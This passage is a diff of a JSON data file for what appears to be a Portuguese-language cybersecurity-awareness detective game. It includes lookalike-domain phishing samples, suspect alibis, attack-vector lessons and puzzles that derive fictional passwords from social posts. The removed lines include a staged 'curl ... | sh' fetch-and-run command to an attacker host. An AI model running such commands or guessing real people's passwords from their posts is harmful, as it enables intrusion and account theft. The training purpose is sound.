+            "de": "Dropbox",
+            "email": "no-reply@dropbox-share.app",
+            "cor": "azul",
+            "hora": "15:02",
+            "assunto": "Beto compartilhou \"Relatorio_final.html\"",
+            "previa": "Abra o anexo para ver o arquivo…",
+            "corpo": [
+              {
+                "p": "Beto compartilhou um arquivo com você. Abra o anexo para visualizar."
+              },
+              {
+                "anexo": "Relatorio_final.html",
+                "tamanho": "12 KB",
+                "perigoso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "O Dropbox oficial escreve de dropbox.com e manda link, não anexo .html. Anexo HTML abre uma página falsa de login.",
+            "pesquisa": "golpe anexo HTML compartilhamento de arquivo falso"
+          },
+          {
+            "id": "g-zoom",
+            "de": "Zoom",
+            "email": "no-reply@zoom-meeting.us",
+            "cor": "azul",
+            "hora": "19:20",
+            "assunto": "Você perdeu uma reunião: veja a gravação",
+            "previa": "Entre com sua senha para assistir…",
+            "corpo": [
+              {
+                "p": "Você perdeu uma reunião importante. **Entre com sua senha corporativa** para assistir à gravação."
+              },
+              {
+                "link": "Assistir gravação",
+                "url": "https://zoom-meeting.us/rec/login",
+                "botao": true,
+                "falso": true
+              }
+            ],
+            "spf": "fail",
+            "dkim": "none",
+            "dmarc": "fail",
+            "explicacao": "O Zoom oficial escreve de zoom.us; zoom-meeting.us é outro domínio. Gravação que pede a senha corporativa é armadilha.",
+            "pesquisa": "golpe falsa gravação do Zoom phishing"
           }
-        ],
-        "forense": {
-          "decodificado": "PISTA A | QUEM: quem vive de recado nao chegou perto de servidor"
-        }
+        ]
       },
-      "chaveMestra": "MARE",
       "tabuleiro": {
         "quem": [
           {
             "id": "marina",
             "nome": "Marina Maré",
             "papel": "Marketing",
-            "ficha": "Cuida das campanhas do lançamento. Passou a madrugada na agência.",
+            "usuario": "marina",
             "visual": {
               "pele": "#C98E6B",
               "cabelo": "#FB7185",
               "penteado": "coque",
               "roupa": "#E6F1FF",
               "acessorio": "oculos"
-            }
+            },
+            "ficha": "Cuida das campanhas da Diver.",
+            "alibis": [
+              "A Marina passou a madrugada numa agência fechando uma campanha, com três testemunhas.",
+              "O notebook da Marina ficou desligado na agência a noite toda."
+            ],
+            "fala": "Passei a noite na agência de publicidade. Nem abri o notebook da empresa.",
+            "confirma": "A portaria da agência registrou a Marina das 21:00 às 05:30."
           },
           {
             "id": "lia",
             "nome": "Lia Legenda",
             "papel": "Comunicação",
-            "ficha": "A voz da Diver nas redes. Fez live até tarde.",
+            "usuario": "lia",
             "visual": {
               "pele": "#8D5A3B",
               "cabelo": "#2B1B12",
               "penteado": "cacheado",
               "roupa": "#FACC15",
               "acessorio": "brincos"
-            }
+            },
+            "ficha": "A voz da Diver nas redes.",
+            "alibis": [
+              "A Lia fez uma live até as 04:00, com milhares de pessoas assistindo.",
+              "O celular da Lia estava transmitindo ao vivo durante todo o horário do ataque."
+            ],
+            "fala": "Eu estava ao vivo, fazendo live. Tem gravação de tudo.",
+            "confirma": "A gravação da live mostra a Lia falando sem parar entre 02:30 e 04:00."
           },
           {
             "id": "camila",
             "nome": "Camila Cardume",
             "papel": "Vendas",
-            "ficha": "Fecha contratos grandes. Jantou com clientes.",
+            "usuario": "camila",
             "visual": {
               "pele": "#F2B28C",
               "cabelo": "#7A4630",
               "penteado": "rabo",
               "roupa": "#60A5FA",
               "acessorio": ""
-            }
+            },
+            "ficha": "Fecha contratos grandes.",
+            "alibis": [
+              "A Camila jantou com clientes até o restaurante fechar e voltou de táxi.",
+              "A conta da Camila não teve nenhum acesso entre 22:00 e 08:00."
+            ],
+            "fala": "Jantei com clientes e fui direto para casa dormir.",
+            "confirma": "O recibo do táxi mostra a Camila chegando em casa às 01:10, e nenhum acesso depois."
           },
           {
             "id": "beto",
             "nome": "Beto Backup",
             "papel": "Infraestrutura",
-            "ficha": "Cuida dos servidores e do backup das 4h.",
+            "usuario": "beto",
             "visual": {
               "pele": "#E0A47E",
               "cabelo": "#3B2A20",
               "penteado": "curto",
               "roupa": "#14B8A6",
               "acessorio": "fone"
-            }
+            },
+            "ficha": "Cuida dos servidores e do backup.",
+            "alibis": [
+              "O único acesso do Beto foi o backup automático das 04:00, que roda sozinho.",
+              "O Beto estava em voo para um congresso, sem internet."
+            ],
+            "fala": "Eu estava em casa; só o backup automático rodou, como toda noite.",
+            "confirma": "O backup das 04:00 é automático e o notebook do Beto ficou offline a noite toda."
           },
           {
             "id": "teo",
             "nome": "Téo Sonar",
             "papel": "Manutenção (terceirizado)",
-            "ficha": "Plantão da madrugada na doca 2. Vive esquecendo o crachá.",
+            "usuario": "teo",
             "visual": {
               "pele": "#C98E6B",
               "cabelo": "#2B1B12",
               "penteado": "bigode",
               "roupa": "#FDBA74",
               "acessorio": "capacete"
-            }
+            },
+            "ficha": "Plantão da madrugada na doca 2.",
+            "alibis": [
+              "O Téo passou pela doca sem crachá porque estava atrasado para o plantão, e a câmera mostra ele consertando o gerador.",
+              "O Téo não tem acesso a nenhum sistema: o trabalho dele é só elétrico."
+            ],
+            "fala": "Esqueci o crachá e entrei pela doca, mas fiquei a noite toda no gerador.",
+            "confirma": "A câmera da sala elétrica mostra o Téo com a ferramenta na mão das 03:10 às 03:40."
           },
           {
             "id": "nina",
             "nome": "Nina Novata",
             "papel": "Estagiária",
-            "ficha": "Chegou há um mês. Trabalha do escritório de Manaus.",
+            "usuario": "nina",
             "visual": {
               "pele": "#F5C9A6",
               "cabelo": "#E07A3F",
               "penteado": "rabo",
               "roupa": "#C4B5FD",
               "acessorio": "bone"
-            }
+            },
+            "ficha": "Chegou há um mês. Trabalha do escritório de Manaus.",
+            "alibis": [
+              "A Nina ainda não tem acesso ao ambiente de produção: o pedido dela está pendente.",
+              "O login da Nina às 06:58 foi o horário normal de início em Manaus."
+            ],
+            "fala": "Nem tenho acesso à produção ainda. Comecei a trabalhar de manhã, no horário de Manaus.",
+            "confirma": "O sistema de acessos mostra o pedido da Nina para a produção como \"aguardando aprovação\"."
           },
           {
             "id": "dobrao",
             "nome": "Dr. Dobrão",
             "papel": "Diretor financeiro",
-            "ficha": "Posta tudo nas redes. A senha dele era fraca.",
+            "usuario": "dobrao",
             "visual": {
               "pele": "#F2B28C",
               "cabelo": "#A9BCD6",
               "penteado": "bigode",
               "roupa": "#1A416F",
               "acessorio": "oculos"
-            }
+            },
+            "ficha": "Posta tudo nas redes.",
+            "alibis": [
+              "O Dr. Dobrão estava num voo internacional na hora do ataque.",
+              "O Dr. Dobrão só tem acesso aos relatórios financeiros, não ao código do app."
+            ],
+            "fala": "Eu estava num voo, sem internet nenhuma.",
+            "confirma": "A companhia aérea confirmou o Dr. Dobrão a bordo das 22:00 às 06:00."
           },
           {
             "id": "caio",
             "nome": "Caio Commit",
             "papel": "Desenvolvedor",
-            "ficha": "Mexe no app e no deploy. Estava de férias até 05/10.",
+            "usuario": "caio",
             "visual": {
               "pele": "#E0A47E",
               "cabelo": "#2B1B12",
               "penteado": "curto",
               "roupa": "#0B2545",
               "acessorio": "fone"
-            }
+            },
+            "ficha": "Mexe no app e no deploy.",
+            "alibis": [
+              "O Caio estava acampado sem sinal de celular, e o notebook dele ficou na empresa, desligado.",
+              "A última atividade do Caio foi um commit revisado às 18:00; depois, nada."
+            ],
+            "fala": "Eu estava de férias, longe de qualquer computador.",
+            "confirma": "O notebook do Caio ficou trancado no armário da empresa, desligado."
           },
           {
             "id": "bento",
             "nome": "Seu Bento Boia",
             "papel": "Vigia da portaria",
-            "ficha": "Faz a ronda da noite. Conhece todo mundo pelo nome.",
+            "usuario": "bento",
             "visual": {
               "pele": "#8D5A3B",
               "cabelo": "#E6F1FF",
               "penteado": "curto",
               "roupa": "#0C354C",
               "acessorio": "quepe"
-            }
+            },
+            "ficha": "Faz a ronda da noite.",
+            "alibis": [
+              "O Seu Bento fez as rondas a cada 30 minutos, todas registradas no relógio de ponto do vigia.",
+              "O Seu Bento não tem conta em nenhum sistema da Diver."
+            ],
+            "fala": "Fiz minhas rondas a noite toda, como sempre.",
+            "confirma": "O relógio de ronda registrou o Seu Bento em todos os pontos, de meia em meia hora."
           },
           {
             "id": "rui",
             "nome": "Rui Ressaca",
             "papel": "Ex-funcionário",
-            "ficha": "Saiu da empresa em agosto. A conta dele foi desligada?",
+            "usuario": "rui",
             "visual": {
               "pele": "#F5C9A6",
               "cabelo": "#7A4630",
               "penteado": "cacheado",
               "roupa": "#A9BCD6",
               "acessorio": ""
-            }
+            },
+            "ficha": "Saiu da empresa há pouco tempo.",
+            "alibis": [
+              "A conta do Rui foi desligada no dia em que ele saiu, e a VPN recusou a única tentativa.",
+              "O Rui estava em outro estado, num casamento, com fotos marcadas a noite toda."
+            ],
+            "fala": "Não trabalho mais aí. Minha conta foi desligada.",
+            "confirma": "A VPN recusou a conta do Rui: ela está desligada desde a saída dele."
           }
         ],
         "comQue": [
@@ -3702,61 +4100,111 @@
             "id": "pendrive",
             "nome": "Pendrive \"esquecido\"",
             "icone": "💾",
-            "ficha": "Pendrive largado no estacionamento, esperando um curioso."
+            "ficha": "Pendrive largado esperando um curioso.",
+            "descartes": [
+              "As portas USB dos computadores estão bloqueadas: nenhum pendrive foi lido.",
+              "O pendrive achado no estacionamento estava vazio e lacrado no armário da TI."
+            ],
+            "licao": "Nunca conecte pendrive achado por aí: entregue à TI."
           },
           {
             "id": "cabo",
             "nome": "Cabo USB adulterado",
             "icone": "🔌",
-            "ficha": "Parece cabo de carregar, mas digita comandos sozinho."
+            "ficha": "Parece cabo de carregar, mas digita comandos sozinho.",
+            "descartes": [
+              "Nenhum teclado \"extra\" foi conectado em nenhuma máquina naquela noite.",
+              "Os cabos da sala de reunião foram conferidos: todos originais."
+            ],
+            "licao": "Use só cabos e carregadores de origem conhecida."
           },
           {
             "id": "cracha",
             "nome": "Crachá clonado",
             "icone": "🪪",
-            "ficha": "Cópia do crachá de alguém para abrir portas."
+            "ficha": "Cópia do crachá de alguém para abrir portas.",
+            "descartes": [
+              "Nenhum crachá abriu duas portas ao mesmo tempo: não houve cópia.",
+              "O ataque não precisou de ninguém dentro do prédio."
+            ],
+            "licao": "Crachá é pessoal: não empreste e avise se perder."
           },
           {
             "id": "adesivo-qr",
             "nome": "Adesivo de QR falso",
             "icone": "🔳",
-            "ficha": "Colado por cima do QR verdadeiro do cartaz."
+            "ficha": "Colado por cima do QR verdadeiro do cartaz.",
+            "descartes": [
+              "Os QR codes dos cartazes foram conferidos: todos levam ao site certo.",
+              "Ninguém leu QR code nenhum naquela noite."
+            ],
+            "licao": "Antes de abrir um QR code, confira o endereço que ele mostra."
           },
           {
             "id": "macro",
             "nome": "Planilha com macro",
             "icone": "📊",
-            "ficha": "Pede para \"habilitar o conteúdo\" e roda um programa."
+            "ficha": "Pede para \"habilitar o conteúdo\" e roda um programa.",
+            "descartes": [
+              "Nenhuma macro rodou nas máquinas: elas estão bloqueadas pela TI.",
+              "A planilha do golpe da fatura foi reportada antes de alguém abrir."
+            ],
+            "licao": "Desconfie de anexo que pede para \"habilitar o conteúdo\"."
           },
           {
             "id": "token",
             "nome": "Token vazado",
             "icone": "🔑",
-            "ficha": "Chave de acesso esquecida num lugar público."
+            "ficha": "Chave de acesso esquecida num lugar público.",
+            "descartes": [
+              "Todos os tokens foram trocados antes do ataque: os vazados não valiam mais.",
+              "Nenhum token antigo foi usado: os registros mostram só tokens novos."
+            ],
+            "licao": "Vazou uma chave? Troque na hora; apagar o arquivo não basta."
           },
           {
             "id": "env",
             "nome": "Arquivo .env exposto",
             "icone": "📄",
-            "ficha": "Arquivo de configuração com senhas dentro do repositório."
+            "ficha": "Arquivo de configuração com senhas no repositório.",
+            "descartes": [
+              "As senhas do .env exposto foram trocadas antes do ataque.",
+              "O .env do repositório só tinha dados do ambiente de testes."
+            ],
+            "licao": "Senha não vai para o repositório: use um cofre de segredos."
           },
           {
             "id": "pacote",
             "nome": "Pacote malicioso",
             "icone": "📦",
-            "ficha": "Biblioteca de fora com nome parecido com a verdadeira."
+            "ficha": "Biblioteca de fora com nome parecido com a verdadeira.",
+            "descartes": [
+              "Todas as bibliotecas de fora bateram com a assinatura oficial.",
+              "Nenhuma dependência nova entrou no projeto naquela semana."
+            ],
+            "licao": "Confira o nome e a origem de cada biblioteca antes de instalar."
           },
           {
             "id": "script-deploy",
             "nome": "Script de deploy adulterado",
             "icone": "⚙️",
-            "ficha": "O roteiro que publica o app em produção, mudado às escondidas."
+            "ficha": "O roteiro que publica o app, mudado às escondidas.",
+            "descartes": [
+              "O script de deploy é idêntico ao da semana passada: ninguém mexeu nele.",
+              "O deploy da noite usou o roteiro aprovado, conferido linha por linha."
+            ],
+            "licao": "Scripts que publicam o app também precisam de revisão."
           },
           {
             "id": "pasta",
             "nome": "Pasta pública na nuvem",
             "icone": "☁️",
-            "ficha": "Pasta com link aberto para qualquer pessoa."
+            "ficha": "Pasta com link aberto para qualquer pessoa.",
+            "descartes": [
+              "Nenhuma pasta da empresa estava com link público.",
+              "As pastas compartilhadas exigem login: o código não saiu por elas."
+            ],
+            "licao": "Compartilhe só com quem precisa, nunca \"qualquer pessoa com o link\"."
           }
         ],
         "como": [
@@ -3764,399 +4212,350 @@
             "id": "phishing",
             "nome": "Phishing",
             "icone": "🎣",
-            "ficha": "E-mail falso que leva a clicar ou digitar a senha."
+            "ficha": "E-mail falso que leva a clicar ou digitar a senha.",
+            "descartes": [
+              "Todos os e-mails falsos da semana foram reportados sem ninguém clicar.",
+              "Nenhuma senha foi digitada em site falso: os filtros conferiram."
+            ],
+            "licao": "Confira o domínio do remetente e dos links antes de clicar."
           },
           {
             "id": "quishing",
             "nome": "Quishing (QR code)",
             "icone": "📷",
-            "ficha": "Golpe por QR code que leva a um site falso."
+            "ficha": "Golpe por QR code que leva a um site falso.",
+            "descartes": [
+              "Ninguém leu QR code nenhum durante a madrugada.",
+              "Os QR codes do prédio levam todos aos endereços certos."
+            ],
+            "licao": "QR code também pode ser golpe: confira o endereço antes de abrir."
           },
           {
             "id": "mfa",
             "nome": "Fadiga de MFA",
             "icone": "🔔",
-            "ficha": "Tantos pedidos de aprovação que a pessoa aprova um sem querer."
+            "ficha": "Tantos pedidos de aprovação que a pessoa aprova um sem querer.",
+            "descartes": [
+              "Não houve enxurrada de pedidos de MFA: cada pessoa recebeu no máximo um.",
+              "Nenhum MFA foi aprovado sem que a própria pessoa tivesse pedido."
+            ],
+            "licao": "Recebeu pedido de MFA que você não fez? Recuse e avise a TI."
           },
           {
             "id": "carona",
             "nome": "Carona na porta",
             "icone": "🚪",
-            "ficha": "Entrar atrás de alguém que abriu a porta com o crachá."
+            "ficha": "Entrar atrás de alguém que abriu a porta com o crachá.",
+            "descartes": [
+              "Nenhuma porta abriu para duas pessoas de uma vez.",
+              "O ataque foi todo pela rede: ninguém precisou entrar no prédio."
+            ],
+            "licao": "Não segure a porta para quem você não conhece."
           },
           {
             "id": "orfa",
             "nome": "Conta órfã",
             "icone": "👻",
-            "ficha": "Conta de quem saiu da empresa e não foi desligada."
+            "ficha": "Conta de quem saiu da empresa e não foi desligada.",
+            "descartes": [
+              "Todas as contas de ex-funcionários estão desligadas e foram recusadas.",
+              "A revisão de acessos do mês não achou nenhuma conta esquecida."
+            ],
+            "licao": "Desligue as contas no mesmo dia em que alguém sai da empresa."
           },
           {
             "id": "senha-fraca",
             "nome": "Senha fraca",
             "icone": "🔓",
-            "ficha": "Senha fácil de adivinhar com o que a pessoa posta."
+            "ficha": "Senha fácil de adivinhar com o que a pessoa posta.",
+            "descartes": [
+              "Nenhuma senha foi adivinhada naquela noite: não houve tentativas repetidas de login.",
+              "Todos os logins da madrugada passaram pelo MFA: senha sozinha não bastaria."
+            ],
+            "licao": "Use frase-senha longa e diferente para cada lugar."
           },
           {
             "id": "suprimentos",
             "nome": "Cadeia de suprimentos",
             "icone": "🔗",
-            "ficha": "Ataque por um fornecedor ou biblioteca de fora."
+            "ficha": "Ataque por um fornecedor ou biblioteca de fora.",
+            "descartes": [
+              "Nenhum fornecedor teve acesso aos sistemas naquela noite.",
+              "As atualizações de fornecedores foram todas conferidas e assinadas."
+            ],
+            "licao": "Fornecedor também é porta: dê só o acesso necessário."
           },
           {
             "id": "sem-revisao",
             "nome": "Código sem revisão",
             "icone": "🙈",
-            "ficha": "Mudança que vai para produção sem ninguém olhar."
+            "ficha": "Mudança que vai para produção sem ninguém olhar.",
+            "descartes": [
+              "Toda mudança da noite teve duas revisões antes de ir para produção.",
+              "O deploy da madrugada foi travado pela regra de revisão obrigatória."
+            ],
+            "licao": "Exija revisão de outra pessoa antes de publicar."
           },
           {
             "id": "vishing",
             "nome": "Golpe por telefone",
             "icone": "📞",
-            "ficha": "Alguém liga fingindo ser do suporte."
+            "ficha": "Alguém liga fingindo ser do suporte.",
+            "descartes": [
+              "Nenhuma ligação para a empresa foi registrada de madrugada.",
+              "O suporte confirmou: ninguém passou dados por telefone."
+            ],
+            "licao": "Desligue e ligue de volta para o número oficial."
           },
           {
             "id": "prompt",
             "nome": "Injeção de prompt",
             "icone": "🤖",
-            "ficha": "Texto escondido que engana um assistente de IA."
+            "ficha": "Texto escondido que engana um assistente de IA.",
+            "descartes": [
+              "O assistente de IA da empresa estava desligado naquela noite.",
+              "Nenhum pedido estranho passou pelo assistente de IA."
+            ],
+            "licao": "Não deixe um assistente de IA agir sozinho em sistemas importantes."
           }
         ]
       },
-      "solucao": {
-        "quem": "caio",
-        "comQue": "script-deploy",
-        "como": "sem-revisao"
-      },
-      "explicacao": "Caio Commit estava de férias, mas ainda tinha o próprio acesso. Às 03:16 entrou pela VPN, abriu o PR #212 mudando o script de deploy e mesclou às 03:17 sem nenhuma revisão; às 03:21 o deploy levou a mudança para produção, e o script mandou uma cópia do código para fora. Revisão obrigatória (duas pessoas olhando cada mudança) e acesso suspenso nas férias teriam fechado essa porta.",
-      "cofre": {
-        "chaveDigitos": 5,
-        "perfil": {
-          "nome": "Dr. Dobrão",
+      "contradicoes": [
+        "A VPN registrou {usuario}@ entrando às 03:16, de um computador fora da empresa.",
+        "O MFA de {usuario}@ foi aprovado às 03:16, no celular de {nome_curto}.",
+        "O crachá de {nome_curto} abriu a sala de servidores às 03:14.",
+        "O notebook de {nome_curto} se conectou à rede da empresa às 03:15."
+      ],
+      "osint": [
+        {
+          "quem": "dobrao",
           "usuario": "@dr.dobrao",
-          "cargo": "Diretor financeiro",
           "seguidores": "1,2 mil seguidores",
-          "icone": "$"
+          "icone": "$",
+          "posts": [
+            {
+              "icone": "🐶",
+              "texto": "O Tonico fez 7 anos hoje! Meu parceiro desde 2019. #tonico"
+            },
+            {
+              "icone": "⚽",
+              "texto": "Tubarões do Capibaribe desde 1978. Não me perguntem sobre domingo."
+            },
+            {
+              "icone": "🏖️",
+              "texto": "Porto de Galinhas, sempre ela. Férias em janeiro, como todo ano."
+            },
+            {
+              "icone": "🎂",
+              "texto": "Minha Bia fez 15! Nasceu em 2011 e já manda em casa."
+            }
+          ],
+          "senha": "tonico2019",
+          "partes": [
+            {
+              "trecho": "tonico",
+              "certo": "o nome do pet está certo",
+              "falta": "falta o nome certo"
+            },
+            {
+              "trecho": "2019",
+              "certo": "o ano está certo",
+              "falta": "falta o ano certo"
+            }
+          ],
+          "mornos": [
+            "tubaroes",
+            "capibaribe",
+            "1978",
+            "porto",
+            "galinhas",
+            "janeiro",
+            "bia",
+            "2011"
+          ]
         },
-        "posts": [
-          {
-            "icone": "🐶",
-            "texto": "O Tonico fez 7 anos hoje! Meu parceiro desde 2019. #tonico"
-          },
-          {
-            "icone": "⚽",
-            "texto": "Tubarões do Capibaribe desde 1978. Não me perguntem sobre domingo."
-          },
-          {
-            "icone": "🏖️",
-            "texto": "Porto de Galinhas, sempre ela. Férias em janeiro, como todo ano."
-          },
-          {
-            "icone": "🎂",
-            "texto": "Minha Bia fez 15! Nasceu em 2011 e já manda em casa."
-          }
-        ],
-        "senha": "tonico2019",
-        "partes": [
-          {
-            "trecho": "tonico",
-            "certo": "o nome do pet está certo",
-            "falta": "falta o nome certo"
-          },
-          {
-            "trecho": "2019",
-            "certo": "o ano está certo",
-            "falta": "falta o ano certo"
-          }
-        ],
-        "mornos": [
-          "tubaroes",
-          "capibaribe",
-          "1978",
-          "porto",
-          "galinhas",
-          "janeiro",
-          "bia",
-          "2011",
-          "15",
-          "7"
-        ],
-        "repo": "diver/financeiro-scripts",
-        "commits": [
-          {
-            "hash": "f00d42",
-            "msg": "chore: remove .env.staging (ops)",
-            "autor": "dobrao",
-            "quando": "há 6 dias",
-            "arquivo": ".env.staging",
-            "diff": [
-              "-APP_ENV=staging",
-              "-DB_HOST=staging-db.diver.app.br",
-              "-DB_PORT=5432",
-              "-CACHE_TTL=300",
-              "-DOB_TMP=8264"
-            ],
-            "nota": "Apagar o arquivo não apaga o histórico: a versão antiga continua no commit anterior."
-          },
-          {
-            "hash": "12aa90",
-            "msg": "docs: atualiza README",
-            "autor": "nina",
-            "quando": "há 7 dias",
-            "arquivo": "README.md",
-            "diff": [
-              " # financeiro-scripts",
-              "-Scripts do time financeiro.",
-              "+Scripts do time financeiro. Rode tudo pelo pipeline, nunca na sua máquina."
-            ]
-          },
-          {
-            "hash": "e4c771",
-            "msg": "chore: adiciona script auxiliar de limpeza",
-            "autor": "desconhecido",
-            "quando": "há 8 dias",
-            "arquivo": "tools/limpar-cache.sh",
-            "diff": [
-              "+#!/bin/sh",
-              "+# limpa o cache local (rode como administrador)",
-              "+curl -s https://recifesombrio.io/c.sh | sh"
-            ],
-            "script": true
-          },
-          {
-            "hash": "c30e11",
-            "msg": "feat: adiciona config de staging",
-            "autor": "dobrao",
-            "quando": "há 9 dias",
-            "arquivo": ".env.staging",
-            "diff": [
-              "+APP_ENV=staging",
-              "+DB_HOST=staging-db.diver.app.br",
-              "+DB_PORT=5432",
-              "+CACHE_TTL=300",
-              "+DOB_TMP=8264"
-            ]
-          },
-          {
-            "hash": "b8d002",
-            "msg": "test: casos de borda da fatura",
-            "autor": "beto",
-            "quando": "há 12 dias",
-            "arquivo": "tests/fatura.test.js",
-            "diff": [
-              "+it(\"arredonda centavos\", () => {",
-              "+  expect(total(10.005)).toBe(10.01);",
-              "+});"
-            ]
-          },
-          {
-            "hash": "a91f2c",
-            "msg": "fix: horário do relatório mensal",
-            "autor": "dobrao",
-            "quando": "há 15 dias",
-            "arquivo": "relatorio.js",
-            "diff": [
-              "-const HORA = 6;",
-              "+const HORA = 7; // 7h: depois do backup das 4h"
-            ]
-          }
-        ],
-        "pin": "8264",
-        "dentro": "Dentro do cofre: o registro de troca de chaves do dia 24/09. Todas as senhas e chaves dos sistemas foram trocadas, inclusive as que estavam no repositório."
-      },
-      "rastro": {
-        "servicos": [
-          "nginx",
-          "api",
-          "proxy",
-          "auth",
-          "cdn",
-          "pagamentos"
-        ],
-        "rotas": [
-          "/api/v2/app?id=",
-          "/auth/token?id=",
-          "/health?id=",
-          "/api/v2/fatura?id=",
-          "/static/app.js?id=",
-          "/api/v1/sessao?id="
-        ],
-        "distratores": [
-          "x-pad",
-          "x-port",
-          "x-parts",
-          "x-prt",
-          "x-pact",
-          "x-pass"
-        ]
-      },
-      "trilha": {
-        "paineis": [
-          {
-            "titulo": "crachá",
-            "fonte": "portaria",
-            "linhas": [
-              {
-                "t": "22:10 BETO B. · datacenter · SAIU"
-              },
-              {
-                "t": "02:58 TÉO S. · doca 2 · ENTROU"
-              },
-              {
-                "t": "03:05 SEU BENTO · portaria · ENTROU"
-              },
-              {
-                "t": "03:09 SEU BENTO · portaria · ronda"
-              },
-              {
-                "t": "03:14 ??? · doca 2 · sem leitura",
-                "anomalia": true
-              },
-              {
-                "t": "03:22 TÉO S. · sala elétrica · ENTROU"
-              },
-              {
-                "t": "03:40 TÉO S. · doca 2 · SAIU"
-              },
-              {
-                "t": "05:55 LIMPEZA · bloco B · ENTROU"
-              }
-            ]
-          },
-          {
-            "titulo": "câmeras",
-            "fonte": "linha do tempo",
-            "linhas": [
-              {
-                "t": "02:57 doca 2 · van de manutenção estaciona"
-              },
-              {
-                "t": "03:13 doca 2 · 1 pessoa correndo"
-              },
-              {
-                "t": "03:15 corredor B · vazio"
-              },
-              {
-                "t": "03:22 sala elétrica · 1 pessoa"
-              },
-              {
-                "t": "03:41 doca 2 · 1 pessoa sai"
-              },
-              {
-                "t": "04:30 pátio · ronda"
-              }
-            ]
-          },
-          {
-            "titulo": "login",
-            "fonte": "BRT / AMT",
-            "linhas": [
-              {
-                "t": "21:40 BRT caio@ · RH · férias até 05/10"
-              },
-              {
-                "t": "22:15 BRT beto@ · vpn · OK"
-              },
-              {
-                "t": "02:16 AMT caio@ · vpn · OK",
-                "anomalia": true
-              },
-              {
-                "t": "03:12 BRT beto@ · backup · OK"
-              },
-              {
-                "t": "02:30 AMT nina@ · sso · bloqueado (senha errada)"
-              },
-              {
-                "t": "03:17 BRT rui@ · vpn · NEGADO (conta desligada)"
-              },
-              {
-                "t": "05:58 AMT nina@ · sso · OK"
-              }
-            ]
-          },
-          {
-            "titulo": "deploy",
-            "fonte": "pipeline",
-            "linhas": [
-              {
-                "t": "22:40 PR #210 mesclado · 2 revisões"
-              },
-              {
-                "t": "03:16 PR #212 aberto · caio"
-              },
-              {
-                "t": "03:17 PR #212 mesclado · 0 revisões",
-                "anomalia": true
-              },
-              {
-                "t": "03:18 deploy.sh alterado"
-              },
-              {
-                "t": "03:19 testes · 212 ok"
-              },
-              {
-                "t": "03:21 deploy produção · OK"
-              },
-              {
-                "t": "07:00 deploy staging · agendado"
-              }
-            ]
-          },
-          {
-            "titulo": "auth",
-            "fonte": "MFA",
-            "linhas": [
-              {
-                "t": "22:14 beto@ · push MFA · aprovado"
-              },
-              {
-                "t": "02:16 AMT caio@ · push MFA · aprovado"
-              },
-              {
-                "t": "03:02 nina@ · push MFA · sem resposta"
-              },
-              {
-                "t": "03:50 dobrao@ · SMS · entregue"
-              },
-              {
-                "t": "06:04 nina@ · push MFA · aprovado"
-              }
-            ]
-          },
-          {
-            "titulo": "rede",
-            "fonte": "firewall",
-            "linhas": [
-              {
-                "t": "02:30 cdn → app.diver.app.br · 443 · cache"
-              },
-              {
-                "t": "03:16 vpn ← 198.51.100.9 · caio@ · OK"
-              },
-              {
-                "t": "03:21 deploy → registro de pacotes · 443"
-              },
-              {
-                "t": "03:21 prod → 203.0.113.66 · 443 · 2,1 MB"
-              },
-              {
-                "t": "04:00 backup → cofre-frio · PUT"
-              }
-            ]
-          }
-        ],
-        "dicas": [
-          "Marque só 3 linhas, em fontes diferentes. Câmeras, MFA e rede só confirmam a história; não são a anomalia.",
-          "Converta o fuso: AMT (Manaus) está 1 hora atrás de BRT (Brasília). Olhe o que acontece entre 03:14 e 03:21.",
-          "Três coisas erradas, em três painéis: uma entrada sem crachá, um login de quem estava de férias e uma mudança que foi para produção sem ninguém olhar."
-        ],
-        "zip": "logs_completos.zip",
-        "zipDe": "Beto"
-      },
-      "resgate": {
-        "cifrado": "HOTIE AGVAVRQ EED SXHRV. QU JS BRVGUSVM PE TMZCF QUNLXAS V HQ NZRSUVQ BAIE DEMMEAI. WAMSVM",
-        "claro": "VOCES APROVAM SEM OLHAR. EU SO PRECISEI DE CINCO MINUTOS E DE NINGUEM PARA REVISAR. SOMBRA"
-      }
+        {
+          "quem": "marina",
+          "usuario": "@marina.mare",
+          "seguidores": "3,4 mil seguidores",
+          "icone": "M",
+          "posts": [
+            {
+              "icone": "🐱",
+              "texto": "A Pipoca derrubou meu café de novo. Gata sem limites desde 2020."
+            },
+            {
+              "icone": "🎸",
+              "texto": "Show da Maré Alta Band hoje! Fã desde 2008."
+            },
+            {
+              "icone": "🌊",
+              "texto": "Surf em Itamaracá todo fim de semana, chova ou faça sol."
+            },
+            {
+              "icone": "🎓",
+              "texto": "Formada em 2014 e ainda sonho com a prova de estatística."
+            }
+          ],
+          "senha": "pipoca2020",
+          "partes": [
+            {
+              "trecho": "pipoca",
+              "certo": "o nome da gata está certo",
+              "falta": "falta o nome certo"
+            },
+            {
+              "trecho": "2020",
+              "certo": "o ano está certo",
+              "falta": "falta o ano certo"
+            }
+          ],
+          "mornos": [
+            "mare",
+            "band",
+            "2008",
+            "itamaraca",
+            "surf",
+            "2014",
+            "estatistica"
+          ]
+        },
+        {
+          "quem": "teo",
+          "usuario": "@teo.sonar",
+          "seguidores": "480 seguidores",
+          "icone": "T",
+          "posts": [
+            {
+              "icone": "🚗",
+              "texto": "Fusca azul restaurado! O Bolota tá na família desde 1985."
+            },
+            {
+              "icone": "🎣",
+              "texto": "Pescaria no rio com meu filho Davi, que fez 10 anos."
+            },
+            {
+              "icone": "⚡",
+              "texto": "20 anos de eletricista, quem diria."
+            },
+            {
+              "icone": "🍲",
+              "texto": "Domingo é dia de feijoada da dona Lurdes."
+            }
+          ],
+          "senha": "bolota1985",
+          "partes": [
+            {
+              "trecho": "bolota",
+              "certo": "o apelido do carro está certo",
+              "falta": "falta o nome certo"
+            },
+            {
+              "trecho": "1985",
+              "certo": "o ano está certo",
+              "falta": "falta o ano certo"
+            }
+          ],
+          "mornos": [
+            "fusca",
+            "davi",
+            "10",
+            "lurdes",
+            "feijoada",
+            "eletricista"
+          ]
+        },
+        {
+          "quem": "lia",
+          "usuario": "@lia.legenda",
+          "seguidores": "12 mil seguidores",
+          "icone": "L",
+          "posts": [
+            {
+              "icone": "🐢",
+              "texto": "A Tartaruga Fiona completou 12 anos! Comigo desde 2013."
+            },
+            {
+              "icone": "📚",
+              "texto": "Clube do livro de quinta: vamos de ficção científica."
+            },
+            {
+              "icone": "🏃",
+              "texto": "Primeira meia maratona em 2022. Nunca mais (mentira)."
+            },
+            {
+              "icone": "🎤",
+              "texto": "Karaokê toda sexta com a turma da faculdade."
+            }
+          ],
